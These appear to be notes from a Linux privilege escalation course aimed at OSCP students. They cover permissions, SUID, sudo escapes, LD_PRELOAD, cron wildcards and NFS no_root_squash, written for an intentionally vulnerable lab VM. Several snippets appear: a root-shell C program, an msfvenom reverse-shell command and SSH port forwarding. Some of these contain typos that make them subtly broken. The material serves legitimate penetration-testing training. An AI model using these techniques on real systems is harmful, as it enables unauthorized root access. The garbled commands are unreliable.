https://www.udemy.com/course/linux-privilege-escalation

Linux Privilege Escalation for OSCP & Beyond!

About Instructor:
Penetration tester for 7 yrs
Used Linux/*nix for 13 yrs
OSCP Certified
Creator of AutoRecon
Admin of "InfoSec Prep" Discord server

Course Overview
Course will focus on privilege escalation techniques in Linux and *nix systems. You will learn:
How basic user privileges work in linux.
Multiple methods for escalating your user's privileges.
Why and how these methods work.
Tools you can use to identify potential escalation paths.

Prerequisites
A basic understanding of Linux systems would be desirable, though the course will cover some aspects. This course assumes that you have fully working low-privileged shell on a Linux system, and will not cover obtaining one (this is a post-exploitation course).

Setup 
This course will be using the Debian VM from the following workshop:

https://github.com/sagishahar/lpeworkshop

The Debian VM has been intentionally misconfigured with numerous privilege escalation methods.

You can download the VM from the Udemy course page. 

The version on Udemy includes a few new methods of privilege escalation. It is recommended that you use this VM for the course. 

The "user" account password is: password321
The "root" account password is: password123

If for some reason you need to use the original VM, or perhaps you already have it set up, there is a Bash script which integrates a few more mis configurations into the VM: 
https://github.com/Tib3rius/privesc-setup

Disclaimer
This course was designed with the OSCP labs and exam in mind, however it attempts to cover a wide range of escalation techniques beyond what an OSCP student is expected to understand. 

Understanding that privilege escalation is often highly complex, and new techniques are developed over time, this course is not intended to be a "complete" guide to every privilege escalation technique.

When appropriate, the author will update the course material to include new techniques which are considered to be valuable. 

Acknowledgments
Sagi Shahar, for creating the Debian VM and privilege escalation workshop, and licensing it such that it could be used in this course. 

Showeet.com, for licensing the presentation template used in this course. 

Devand MacLean, for reviewing the course and suggesting several improvements.


Privilege Escalation in Linux

General Concepts
Our ultimate goal with privilege escalation in Linux is to gain a shell running as the root user. 

Privilege escalation can be simple (e.g. a kernel exploit) or require a lot of reconnaissance on the compromised system.

In a lot of cases, privilege escalation may not simply rely on a single misconfiguration, but may require you to think, and combine multiple misconfiguration. 

All privilege escalations are effectively examples of access control violations.

Access control and user permissions are intrinsically linked. 

When focusing on privilege escalations in Linux, understanding how Linux permissions is very important.

Understanding Permissions in Linux
Users, Groups, and Files & Directories

At a basic level, permissions in Linux are a relationship between users, groups, and files & directories. 

Users can belong to multiple groups.

Groups can have multiple users.

Every file and directory defines its permissions in terms of a user, a group, and "others" (all other users).

Users

User accounts are configured in the /etc/passwd file.
User password hashes are stored in the /etc/shadow file.
Users are identified by an integer user ID (UID)
The "root" user account is a special type of account in Linux. It has a UID of 0, and the system grants this user access to every file.

Groups

Groups are configured in the /etc/group file.
Users have a primary group, and can have multiple secondary (or supplementary) groups.
By default, a user's primary group has the same name as their user account.

Files & Directories

All files & directories have a single owner and a group.
Permissions are defined in terms of read, write, and execute operations.
There are three sets of permissions, one for the owner, one for the group, and one for all "other" users (can be referred to as "world").
Only the owner can change permissions.

File Permissions

File permissions are self explanatory:
-Read - when set, the file contents can be read.
-Write - when set, the file contents can be modified.
-Execute - when set, the file can be executed (i.e. run as some kind of process).

Directory Permissions

Directory permissions are slightly more complicated:
-Execute - when set, the directory can be entered. Without this permission, neither the read nor write permissions will work.
-Read - when set, the directory contents can be listed. 
-Write - when set, files and subdirectories can be created in the directory. 

Special Permissions

setuid (SUID) bit
-When set, files get executed with the privileges of the file owner.

setgid (SGID) bit
-When set ona  file, the file will get executed with the privileges of the file group. When set on a directory, files created within that directory will inherit the group of the directory itself.

Viewing Permissions:

The ls command can be used to view permissions:
$ ls -l /bin/date
-rwxr-xr-x 1 root root 60416 Apr 28 2010 /bin/date

The first 10 characters indicate the permissions set on the file or directory.
The first character simply indicates the type (e.g. '-' for file, 'd' for directory).

Viewing Permissions

The remaining 9 character represents the 3 sets of permissions (owner, group, others).
Each set contains 3 characters, indicating the read (r), write (w), and execute (x) permissions. 

SUID/SGID permissions are represented by the 's' in the execute position.

Real, Effective, and Saved UID/GID

It was previously stated that user are identified by a user ID.
In fact, each user has 3 user IDs in Linux (real, effective, and saved).
A user's real ID is who they actually are (the ID defined in /etc/passwd). Ironically, the real ID is actually used less often to check a user's identity.

A user's effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user's real ID. 

The effective ID is used in most access control decisions to verify a user, and commands such as whoami use the effective ID. 

Finally, the saved ID is used to ensure that SUID processes can temporarily switch a user's effective ID back to their real ID and back again without losing track of their original effective ID. 

Print real and effective user/group IDs:
id

Print real, effective, saved, and file system user/group IDs of the current process (i.e. our shell):
ca /proc/$$/status | grep "[UG]id"

Spawning Root Shells

As stated in the introduction to this course, our ultimate goal is to spawn a root shell.

While the end result is the same (executing /bin/sh or /bin/bash), there are multiple ways of achieving this execution.

In this course, we will use a variety of methods. This section highlights a few which can be used in situations where commands can be executed as root. 

"rootbash" SUID

One of my favorite ways to spawn a root shell is to create a copy of the /bin/bash executable file (I usually rename it rootbash), make sure it is owned by the root user, and has the SUID bit set. 

A root shell can be spawned by simply executing the rootbash file with the -p command line option.

The benefit of this method is it is persistent (once you run the exploit, rootbash can be used multiple times).

Custom Executable

There may be instances where some root process executes another process which you can control. In these cases, the following C code, once compiled will spawn a Bash shell running as root:

init main() {
	setuid(0);
	system("bin/bash -p");
}

Compile using:
$ gcc -i <name> <filename.c>

msfvenom

Alternatively, if reverse shell is preferred, msfvenom can be used to generate an executable (.elf) file:

$msfvenoom -p linudx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

This reverse shell can be caught using netcat or Metasploit's own multi/handler.

Native Reverse Shells

There are multiple ways to spawn reverse shells natively on many linux distributions.

A good tool for suggesting these is:
https://github.com/mthbernardes/rsg

All can be caught using a simple netcat listener.

Privilege Escalation Tools

Why use tools?
Tools can allow us to automate the reconnaissance that can identify potential privilege escalations.

While it is always important to understand what tools are doing, they are invaluable in a time-limited setting, such as an exam.

In this course will will use Linux Smart Enumeration and LinEnum.

Linux Smart Enumeration

Linux Smart Enumeration (lse.sh) has recently become my personal favorite privilege escalation tool.

In addition to being a Bash script (which helps if Python isn't installed), it has multiple levels which gradually reveal more and more information.

https://github.com/diego-treitos/linux-smart-enumeration

LinEnum
LinEnum is an advanced Bash Script which extracts a large amount of useful information from the target system. 

It can copy interesting files for export, and search for files containing a keyword (e.g. "password").

https://github.com/rebootuser/LinEnum

Other Tools
While we won't use these tools in the course, feel free to experiment with them:

https://github.com/linted/linuxprivchecker
https://github.com/AlessandroZ/BeRoot
https://pentestmonkey.net/tools/audit/unix-privesc-check (risky zip)

Kernel Exploits

What is a Kernel?

Kernels are the core of any operating system.

Think of it as a layer between application software and the actual computer hardware.

The kernel has complete control over the operating system.

Exploiting a kernel vulnerability can result in execution as the root user.

Finding Kernel Exploits

Finding and using kernel exploits is usually a simple process:
1. Enumerate kernel version (uname -a).
2. Find matching exploits (Google, ExploitDB, GitHub). 
3. Compile and run.

Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.

Service Exploits

Services are simply programs that run in the background, accepting input or performing regular tasks.

If vulnerable services are running as root, exploiting them can lead to command execution as root. 

Service exploits can be found using Searchsploit, Google, and GitHub, just like with Kernel exploits.

Enumerating Program Versions

Running the program with the --version/-v command line option often shows the version number:

$ <program> --version
$ <program> -v

On Debian-like distributions, dpkg can show installed programs and their version:

$ dpkg -l | grep <program>

On systems that use rpm, the following achieves the same:
$ rpm -qa | grep <program>

Port Forwarding

In some instances, a root process may be bound to an internal port, through which it communicates.

If for some reason, an exploit cannot run locally on the target machine, the port can be forwarded using SSH to your local machine:

$ ssh -R <local-port>:127.0.0.1:<service-port> <username>@<local-machine>

The exploit code can now be run on your local machine at whichever port your chose.

Weak File Permissions

Certain system files can be taken advantage of to perform privilege escalation if the permissions on them are too weak.

If a system file has confidential information we can read, it may be used to gain access to the root account.

If a system file can be written to, we may be able to modify the way the operating system works and gain access that way. 

/etc/shadow

The /etc/shadow file contains user password hashes, and by default is not readable by any user except for root. 
If we are able to read the contents of the /etc/shadow file, we might be able to crack the root user's password hash. 
If we are able to modify the /etc/shadow file, we can replace the root user's password hash with one know. 

/etc/passwd

The /etc/passwd historically contained user password hashes.
For backwards compatibility, if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over he hash in /etc/shadow.

If we can write to /etc/passwd, we can easily enter a known password hash for the root user, and then use the su command to switch to the root user.

Alternatively, if we can only append the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different.

/etc/passwd
The root account in /etc/passwd is usually configured like this:

root:x:0:0:root:/root:/bin/bash

The "x" in the second field instructs Linux to look for the password hash in the /etc/shadow file.

In some versions of Linux, it is possible to simply delete the "x", which Linux interprets as the user having no password:

root::0:0:root:/root:/bin/bash

Backups

Even if a machine has correct permissions on the important or sensitive files, a user may have created backups of these files.

It is always worth exploring the file system looking for readable backup files. Some common place include user home directories, the / (root) directory, /tmp, and /var/backups.

Sudo

What is sudo?

sudo is a program which lets users run other programs with the security privileges of other users. By default, that other user will be root. 

A user generally needs to enter their password to use sudo, and they must be permitted access via rule(s) in the /etc/sudoers file.

Rules can be used to limit users to certain programs, and forgo the password entry requirements. 

Useful Commands

Run a program using sudo:
$ sudo <program>

Run a program as a specific user:
$ sudo -u <username> <program>

List programs a user is allowed (and disallowed) to run:
$ sudo -l

Known Password

By far the most obvious privilege escalation with sudo is to use sudo as it was intended!

If your low privileged user account can use sudo unrestricted (i.e. you can run any programs) as you know the user's password, privilege escalation is easy, by using the "switch user" (su) command to spawn a root shell:
$ sudo su

Shell Escape Sequences

Even if we are restricted to running certain programs via sudo, it is sometimes possible to "escape" the program and spawn a shell. 

Since the initial program runs with root privileges, so does the spawned shell.

A list of programs with their shell escape sequences can be found here: https:gtfobins.github.io

Abusing Intended Functionality 

If a program doesn't have an escape sequence, it may still be possible to use it to escalate privileges. 

If we can read files owned by root, we may be able to extract useful information (e.g. passwords, hashes, keys). 

If we can write to files owned by root, we may be able to insert or modify information. 

Environment Variables

Programs run through sudo can inherit the environment variables from the user's environment.

In the /etc/sudoers config file, if the env_reset option is set, sudo will run programs in a new, minimal environment.

The env_keep option can be used to keep certain environment variables from the user's environment. 

The configured options are displayed when running sudo -l

LD_PRELOAD

LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file. 

When set, the shared object will be loaded before any others.

By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded. 

Limitations

LD_PRELOAD will not work if the real user ID is different from the effective user ID. 

sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option.

LD_LIBRARY_PATH

The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first. 

The ldd command can be used to print the shared libraries used by a program:
$ ldd /usr/sbin/apache2

By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead. 

Cron Jobs

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. 

Cron jobs run with the security level of the user who owns them. 

By default, cron jobs are running using the /bin/sh shell, with limited environment variables. 

Cron table files (contabs) store the configuration for cron jobs. 

User crontabs are usually located in /var/spool/cron/ or /var/spool/cron/crontabs/

The system-wide crontab is located at /etc/crontab.

File Permissions

Misconfiguration of file permissions associated with cron jobs can lead to easy privilege escalation. 


If we can write to a program or script which gets run as part of a cron job, we can replace it with our own code. 


PATH Environment Variable

The crontab PATH environment variable is by default set to /usr/bin:/bin

The PATH variable can be overwritten in the crontab file. 

If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.

Wildcards
When a wildcard character (*) is provided to a command as part of an argument, the shell will first will first perform filename expansion (also known as globbing) on the wildcard. 

This process replaces the wildcard with a space-separated list of the file and directory names in the current directory. 

Any easy way to see this in action is to run the following command from your home directory:

$ echo *

Since filesystems in Linux are generally very permissive with filenames, and filename expansion happens before the command is executed, it is possible to pass command line options (e.g. -h, --help) to commands by creating files with these names. 

The following commands should show how this works:

$ ls *
$ touch ./-l
$ ls *

Filenames are not simply restricted to simple options like -h or --help. 

In fact we can create filenames that match complex options: --option=key=value

GTFOBins (https://gtfobins.github.io) can help determine whether a command has command line options which will be useful for our purposes. 

SUID/SGID Executables 

SUID files get executed with the privileges of the file owner. 

SGID files get executed with the privileges of the file group.

If the file is owned by root, it gets executed with root privileges, and we may be able to use it to escalate privileges. 

We can us the following find command to locate files with the SUID or SGID bits set:

$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

Shell Escape Sequences

Just as we were able to use shell escape sequences with programs running via sudo, we can do the same with SUID/SGID files.

A list of programs with their shell escape sequences can be found here: https://gtfobins.github.io/

Refer to the previous section on shell escape sequences for how to use them.

A Quick Word on LD_PRELOAD & LD_LIBRARY_PATH

You may be thinking: why can't we just use the same LD_PRELOAD and LD_LIBRARY_PATH environment variable tricks we used with sudo privilege escalation?

By default, this is disabled in Linux, due to the obvious security risk it presents!

Both these environment variables get ignored when SUID files are executed. 

Known Exploits

Certain programs install SUID files to aid their operation. Just as services which run as root can have vulnerabilities we can exploit for a root shell, so too can these SUID files. 

Exploits can be found using Searchsploit, Google, and GitHub, int eh same way we find exploits for Kernels and Services. 

Shared Object Injection

When a program is executed, it will try to load the shared objects it requires. 

By using a program called strace, we can track these systems calls and determine whether any shared objects were not found. 

If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded. 

PATH Environment Variable 
The PATH environment variable contains a list of directories where the shell should try to find programs. 

If a program tries to execute another program, but only specifies the program name, rather than its full (absolute) path, the shell will search the PATH directories until it is found. 

Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to. 

Finding Vulnerable Programs

If a program tries to execute another program, the name of that program is likely embedded int he executable file as a string. 

We can run strings on the executable file to find strings of characters. We can also use strace to see how the program is executing. Another program called ltrace may also be of use. 

Running strings against a file:
$ strings /path/to/file

Running strace against a command:
$ strace -v -f -e execve <command> 2>&1 | grep exec

Running ltrace against a command:
$ ltrace <command>

Abusing Shell Features (#1)

In some shells (notably Bash <4.2-048) it is possible to define user functions with an absolute path name. 

These functions can be exported so that subprocess have access to them, and the functions can take precedence over the actual executable being called. 

Abusing Shell Features (#2)

Bash has a debugging mode which can be enabled with the -x command line option, or by modifying the SHELLOPTS environment variable to include xtrace. 

By default, SHELLOPTS is read only, however the env command allows SHELLOPTS to be set. 

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debug statements. This variable can included an embedded command, which will execute every time it is shown. 

If an SUID file runs another program via BASH (e.g. by using system()) these environment variables can be inherited. 

If an SUID file is being executed, this command will execute with the privileges of the file owner. 

In Bash versions 4.4 and above, the PS4 environment variable is not inherited by shells running as root. 

Passwords & Keys

Passwords 

While it might seem like a long shot, weak password storage and password re-use can be easy ways to escalate privileges. 

While the root user's account password is hashed and stored securely in /etc/shadow, other passwords, such as those for services may be stored in plaintext in config files. 

In the root user re-used their password for a service, that password may be found and used to switch to the root user. 

History Files 

History files record commands issued by users while they are using certain programs. 

If a user types a password as part of a command, this password may get stored in a history file. 

It is always a good idea to try switching to the root user with a discovered password. 

Config Files 

Many services and programs use configuration (config) files to store settings. 

If a service needs to authenticate to something, it might store the credentials in a config file. 

If these config files are accessible, and the passwords they store are reused by privileged users, we may be able to use it to log in as that user. 

SSH Keys

SSH keys can be used instead of passwords to authenticate users using SSH. 

SSH keys come in pairs: one private key, and one public key. 

The private key should always be kept secret. 

If a user has stored their private key insecurely, anyone who can read the key may be able to log into their account using it. 

See the weak SSH key demo in the Weak File Permissions lecture. 

NFS

NFS (Network File System) is a popular distributed file system. 

NFS share are configured in the /etc/exports file.

Remote users can mount shares, access, create, modify files. 

By default, created files inherit the remote user's id and group id (as owner and group respectively), even if they don't exist on the NFS server. 

Useful Commands

Show the NFS server's export list:
$ showmount -e <target>

Similar Nmap script:

$ nmap -sV -script=nfs-showmount <target>

Mount an NFS share:

$ mount -o rw,vers=2 <target>:<share> <local_directory>

Root Squashing

Root Squashing is how NFS prevents an obvious privilege escalation. 

If the remote user is (or claims to be) root (uid=0), NFS will instead "squash" the user and treat them as if they are they are the "nobody" user, in the "nogroup" group. 

While this behavior is default, it can be disabled!

no_root_squash

no_root_squash is an NFS configuration option which turns root squashing off. 

When included in a writable share configuration, a remote user who identifies as "root" can create files on the NFS share as the local root user. 

Privilege Escalation Strategy 

Enumeration

1. Check your user (id, whoami)
2. Run Linux Smart Enumeration with increasing levels.
3. Run LinEnum & other scripts as well!
4. If your scripts are failing and you don't know why you can always run the manual commands from this course, and other Linux PrivEscalation cheatsheets online (e.g. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

Strategy

Spend some time and read over the results of your enumeration. 

If Linux Smart Enumeration level 0 or 1 finds something, make a note of it. 

Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work. 

Try things that don't have many steps first, e.g. Sudo, CronJobs, SUID files. 

Have a good look at root processes, enumerate their versions and search for exploits. 

Check for internal ports that you might be able to forward to your attacking machine. 

If you still don't have root, re-read your full enumeration dumps and highlight anything that seems odd. 

This might be a process or file name you aren't familiar with, an "unusual" filesystem configured (on Linux, or anything that isn't ext, swap, or tmpfs), or even a username. 

At this stage you can also start to think about Kernel Exploits. 

Don't Panic

Privilege Escalation is tricky. 

Practice makes perfect. 

Remember: in an exam setting, it might take a while to find the method, but the exam is always intended to be completed within a timeframe. Keep searching!